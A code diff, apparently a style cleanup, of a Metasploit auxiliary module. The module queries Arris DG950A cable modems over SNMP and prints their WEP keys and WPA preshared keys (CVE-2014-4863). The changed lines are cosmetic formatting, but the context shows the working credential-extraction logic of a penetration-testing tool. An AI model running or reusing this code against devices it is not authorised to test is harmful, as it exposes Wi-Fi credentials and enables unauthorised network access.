@@ -10,18 +10,18 @@ class MetasploitModule < Msf::Auxiliary
 
   def initialize
     super(
-      'Name'        => 'Arris DG950A Cable Modem Wifi Enumeration',
-      'Description' => %q{
+      'Name' => 'Arris DG950A Cable Modem Wifi Enumeration',
+      'Description' => '
         This module will extract WEP keys and WPA preshared keys from
         Arris DG950A cable modems.
-      },
-      'References'  =>
+      ',
+      'References' =>
         [
-          ['CVE','2014-4863'],
+          ['CVE', '2014-4863'],
           ['URL', 'https://blog.rapid7.com/2014/08/21/more-snmp-information-leaks-cve-2014-4862-and-cve-2014-4863']
         ],
-      'Author'      => ['Deral "Percent_X" Heiland'],
-      'License'     => MSF_LICENSE
+      'Author' => ['Deral "Percent_X" Heiland'],
+      'License' => MSF_LICENSE
     )
   end
 
@@ -29,7 +29,7 @@ class MetasploitModule < Msf::Auxiliary
     snmp = connect_snmp
 
     if snmp.get_value('sysDescr.0') =~ /DG950A/
-      print_line("#{ip}")
+      print_line(ip.to_s)
 
       # System Admin Password
       wifi_info = ''
@@ -78,19 +78,19 @@ class MetasploitModule < Msf::Auxiliary
           print_line('FAILED')
         end
         wepkey1 = snmp.get_value("#{oid}.1")
-        key1 = "#{wepkey1}"
+        key1 = wepkey1.to_s
         print_line("WEP KEY1: #{key1}")
         wifi_info << "WEP KEY1: #{key1}" << "\n"
         wepkey2 = snmp.get_value("#{oid}.2")
-        key2 = "#{wepkey2}"
+        key2 = wepkey2.to_s
         print_line("WEP KEY2: #{key2}")
         wifi_info << "WEP KEY2: #{key2}" << "\n"
         wepkey3 = snmp.get_value("#{oid}.3")
-        key3 = "#{wepkey3}"
+        key3 = wepkey3.to_s
         print_line("WEP KEY3: #{key3}")
         wifi_info << "WEP KEY3: #{key3}" << "\n"
         wepkey4 = snmp.get_value("#{oid}.4")
-        key4 = "#{wepkey4}"
+        key4 = wepkey4.to_s
         print_line("WEP KEY4: #{key4}")
         wifi_info << "WEP KEY4: #{key4}" << "\n"
 
